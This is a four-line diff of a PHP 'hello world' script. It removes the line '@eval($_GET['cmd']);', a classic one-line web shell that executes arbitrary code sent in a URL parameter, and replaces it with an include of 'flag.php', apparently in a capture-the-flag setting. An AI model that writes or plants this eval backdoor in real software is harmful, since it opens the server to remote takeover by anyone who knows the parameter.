@@ -1,4 +1,4 @@
 <?php 
 echo("hello world");
-@eval($_GET['cmd']); 
+include("flag.php");
 ?>
